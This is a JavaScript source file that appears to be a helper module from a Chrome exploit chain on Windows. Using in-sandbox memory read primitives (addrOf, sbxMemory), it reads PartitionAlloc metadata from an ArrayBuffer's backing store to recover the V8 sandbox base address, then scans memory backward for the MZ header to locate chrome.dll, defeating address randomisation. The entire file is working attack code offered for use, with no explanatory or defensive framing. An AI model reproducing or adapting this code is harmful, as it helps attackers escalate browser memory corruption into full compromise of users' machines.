// RWX helper
// Use PartitionAlloc Metadata to retrieve raw pointers when nothing has leaked
// Work on Windows only
{
    var SANDBOX_BASE, CHROME_DLL_ADDR;
    var _RWX_HELPERS;
    if (typeof _RWX_HELPERS === "undefined") {
        _RWX_HELPERS = {};
    }


    // Extract raw pointers from the PartitionAlloc Metadata (still working with ShadowMetadata)
    // * -> SANDBOX_BASE, CHROME_DLL_ADDR
    _RWX_HELPERS.partitionAllocMetadata = () => {
        log("[i] Searching raw pointers in PartitionAlloc metadata", 1);
        if (typeof SANDBOX_BASE !== "undefined" && typeof CHROME_DLL_ADDR !== "undefined") return;
        assert((FINGERPRINT.platform.os ?? "Windows") === "Windows", "[-] Windows is required", 0);


        // Retrieve the PartitionAlloc Metadata from the backing store of an ArrayBuffer
        let buf = new ArrayBuffer(1);
        let buf_struct = new STRUCTS.JSArrayBuffer(addrOf(buf));
        let buf_backing_store = sbxMemory.getBigUint64(buf_struct.backing_store, true);
        let pa_metadata = ((buf_backing_store >> 3n*8n) & ~0xffffffffn) + 0x1000n;


        // Retrieve SANDBOX_BASE
        if (typeof SANDBOX_BASE === "undefined") {
            let sbx_leak = sbxMemory.getBigUint64(Number(pa_metadata + 0x20n), true);
            SANDBOX_BASE = (sbx_leak & ~0xffffffffn) - (pa_metadata & ~0xffffffffn);
            log("[+] Retrieved SANDBOX_BASE=0x" + hex(SANDBOX_BASE), 2);
        }


        // Retrieve CHROME_DLL_ADDR (use the bucket leak and search backward for MZ magic header)
        if (typeof CHROME_DLL_ADDR === "undefined") {
            let chrome_leak = sbxMemory.getBigUint64(Number(pa_metadata + 0x30n), true) & ~0xffffn;
            for (let i = 0xa000000n; i < 0xff00000n; i += 0x10000n) {
                if (getBigUint(chrome_leak-i, 2) === 0x5a4dn) {
                    CHROME_DLL_ADDR = chrome_leak-i;
                    break;
                }
            }

            assert(typeof(CHROME_DLL_ADDR) !== "undefined", "[-] Failed to retrieve CHROME_DLL_ADDR");

            log("[+] Retrieved CHROME_DLL_ADDR=0x" + hex(CHROME_DLL_ADDR), 2);
            assert(CHROME_DLL_ADDR > 0n && (CHROME_DLL_ADDR & 0xffffn) === 0x0n, "[-] Invalid CHROME_DLL_ADDR pointer");
        }
    }
}
